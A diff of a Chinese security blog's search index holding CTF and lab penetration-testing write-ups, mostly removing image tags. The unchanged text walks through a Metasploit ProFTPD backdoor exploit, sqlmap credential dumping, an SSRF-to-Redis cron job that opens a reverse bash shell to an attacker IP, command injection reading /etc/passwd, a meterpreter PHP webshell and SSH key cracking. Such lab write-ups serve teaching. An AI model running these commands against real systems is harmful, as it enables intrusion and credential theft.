@@ -31,49 +31,19 @@
 <h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png"
-                      alt="图片"
-                ></p>
 <p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
 <p><strong>我们使用第二种方法</strong></p>
 <h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/2.png"
-                      alt="图片"
-                ></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/3.png"
-                      alt="图片"
-                ></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/4.png"
-                      alt="图片"
-                ></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
 
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/5.png"
-                      alt="图片"
-                ></p>
 <p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
 
@@ -88,7 +58,7 @@
       </categories>
       <tags>
         <tag>FTP</tag>
-        <tag>ctf</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -103,12 +73,6 @@
 <h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
 <p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
 </blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421233219892.png"
-                      alt="image-20240421233219892"
-                ></p>
 <p>输入ip进行attack，然后软件开始爬虫并扫描</p>
 <h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
 <p>利用sqlmap利用SQL注入漏洞</p>
@@ -129,36 +93,20 @@
 <h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114353304.png"
-                      alt="image-20240426114353304"
-                ></p>
+
+
 <h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114506297.png"
-                      alt="image-20240426114506297"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114626648.png"
-                      alt="image-20240426114626648"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114736334.png"
-                      alt="image-20240426114736334"
-                ></p>
+
+
 <p>得到用户名和密码</p>
 <p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
 <p><code>/wordpress/wp-login.php</code></p>
@@ -191,36 +139,20 @@
 <h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230128709.png"
-                      alt="image-20240428230128709"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230456334.png"
-                      alt="image-20240428230456334"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230718972.png"
-                      alt="image-20240428230718972"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230846345.png"
-                      alt="image-20240428230846345"
-                ></p>
+
+
 <p>成功获取用户名和密码，登录到后台</p>
 ]]></content>
       <categories>
@@ -228,8 +160,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>sql</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -244,8 +176,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>文件上传</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -253,18 +185,6 @@
     <url>/2024/09/11/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/</url>
     <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
 <p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240505105303580.png"
-                      alt="image-20240505105303580"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240505105319353.png"
-                      alt="image-20240505105319353"
-                ></p>
 <p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
 <ul>
 <li>读取内网文件;</li>
@@ -307,7 +227,7 @@
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
 
 <p>然后攻击机进行监听</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvpp port</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
 
 <p>定时任务执行后就会反弹shell到攻击机</p>
 ]]></content>
@@ -316,8 +236,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>SSRF</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -345,12 +265,6 @@
     <url>/2024/09/11/ctf-%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</url>
     <content><![CDATA[<h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421225824596.png"
-                      alt="image-20240421225824596"
-                ></p>
 <h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
 
 <h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
@@ -362,69 +276,21 @@
 <blockquote>
 <p>在扫描的全部信息里寻找是否为http服务</p>
 </blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230533684.png"
-                      alt="image-20240421230533684"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230548465.png"
-                      alt="image-20240421230548465"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230609664.png"
-                      alt="image-20240421230609664"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230829064.png"
-                      alt="image-20240421230829064"
-                ></p>
 <p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
 <p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
-<p> <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231124735.png"
-                      alt="image-20240421231124735"
-                ></p>
 <p>注意到flag.txt，打开获得flag</p>
 <p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
 <h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231432353.png"
-                     
-                ></p>
 <p>在浏览器输入</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
 
 <p> 匿名登录ftp服务器根目录</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231528647.png"
-                      alt="image-20240421231528647"
-                ></p>
 <p>发现flag</p>
 <p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
 <p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
 
 <p>然后依次打开robots.txt中的目录</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231904846.png"
-                      alt="image-20240421231904846"
-                ></p>
 <p>发现命令执行窗口</p>
 <p>于是想到命令注入</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
@@ -435,12 +301,6 @@
 <p>找到在home下的用户Summer</p>
 <p>然后利用ssh远程连接</p>
 <p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421232215665.png"
-                      alt="image-20240421232215665"
-                ></p>
 <p>于是利用这个端口进行连接</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
 
@@ -457,7 +317,7 @@
       </categories>
       <tags>
         <tag>simple</tag>
-        <tag>ctf</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -475,25 +335,7 @@
 <p>1. </p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420222711076.png"
-                      alt="image-20240420222711076"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420224819220.png"
-                      alt="image-20240420224819220"
-                ></p>
 <p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420225025375.png"
-                      alt="image-20240420225025375"
-                ></p>
 <p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
 <p>连接mysql</p>
 <p><code>mysql -h ip -u user -p</code></p>
@@ -504,24 +346,12 @@
 <li><p>针对SMB协议远程溢出漏洞进行分析</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420231346369.png"
-                      alt="image-20240420231346369"
-                ></p>
 <p>发现也没有漏洞</p>
 </li>
 </ol>
 <h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
 <p>扫描到网站后台目录</p>
 <p>打开并输入用户名和密码</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240420231938322.png"
-                      alt="image-20240420231938322"
-                ></p>
 <h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
 
@@ -552,8 +382,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>SMB</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -567,12 +397,6 @@
 <hr>
 <h3 id="扫描端口目录-寻找隐藏文件"><a href="#扫描端口目录-寻找隐藏文件" class="headerlink" title="扫描端口目录,寻找隐藏文件"></a>扫描端口目录,寻找隐藏文件</h3><p><code>dirb http://ip:port/</code>（80端口可省略）</p>
 <p>如果探测到.ssh，则可以想到密钥泄露，通过ssh远程登陆</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419223847901.png"
-                      alt="image-20240419223847901"
-                ></p>
 <p>&#x3D;&#x3D;id_rsa和id_rsa.pub配对成功才能登陆成功&#x3D;&#x3D;</p>
 <p>为此我们可以尝试打开<code>http://ip:port/.ssh/id_rsa</code>目录，可能会下载到id_rsa，也就是私钥</p>
 <hr>
@@ -589,12 +413,6 @@
 <p>如果探测到robot.txt，打开可以查看不可以被探测的目录，可以寻找到相关信息或者flag1；&#x3D;&#x3D;注意config之类的文件&#x3D;&#x3D;</p>
 <p>可以利用<code>wget url</code>来下载文件</p>
 <h4 id="如果只有公钥"><a href="#如果只有公钥" class="headerlink" title="如果只有公钥"></a>如果只有公钥</h4><p>然后会提示输入密码，尝试root&#x2F;用户名。错误则继续探测</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419224820805.png"
-                      alt="image-20240419224820805"
-                ></p>
 <p>ssh2john id_rsa &gt; rsacrack</p>
 <p>zcat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz | john –pipe -rules isacrack</p>
 <p>然后利用破解的密码进行ssh登录</p>
@@ -631,51 +449,15 @@
 <p>可能会发现flag.txt，但是可能没有权限直接打开</p>
 <p>于是查找具有root权限的文件</p>
 <p><code>find / -perm -4000 2&gt;/dev/null</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419225452580.png"
-                      alt="image-20240419225452580"
-                ></p>
-<p> <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419225516115.png"
-                      alt="image-20240419225516115"
-                ></p>
 <p>发现read_message名字与根目录类似</p>
 <p><code>cat read_message.c</code></p>
 <p>可能会找到flag2</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419225637020.png"
-                      alt="image-20240419225637020"
-                ></p>
 <p>代码审计下面的c语言</p>
 <p>发现调用这个message这个文件并输出相关信息</p>
 <p>打开read_message</p>
 <p><code>read_message</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419230208641.png"
-                      alt="image-20240419230208641"
-                ></p>
 <p>然后我们输入SimonAAA</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419230248981.png"
-                      alt="image-20240419230248981"
-                ></p>
 <p>发现程序只对比到前五个字符，正确就执行程序，于是我们打算溢出字符串buf数组（20长度），然后利用输入的&#x2F;bin&#x2F;sh占用程序，被execve调用，然后成功提权</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240419230423828.png"
-                      alt="image-20240419230423828"
-                ></p>
 <hr>
 <h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p>寻找根目录  <code>/root</code></p>
 <p>然后就可以成功打开flag.txt文件</p>
@@ -694,8 +476,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>ssh</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -745,12 +527,8 @@
 <h3 id="2-确定显示位"><a href="#2-确定显示位" class="headerlink" title="2. 确定显示位"></a>2. 确定显示位</h3><p>利用union将两个语句进行连接并输出</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users union SELECT password,last_name FROM users</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240504162942979.png"
-                      alt="image-20240504162942979"
-                ></p>
+
+
 <p>上面五行是前一个语句的输出，后面五行是后一个语句的输出。</p>
 <blockquote>
 <p>注：</p>
@@ -856,8 +634,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>sql</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
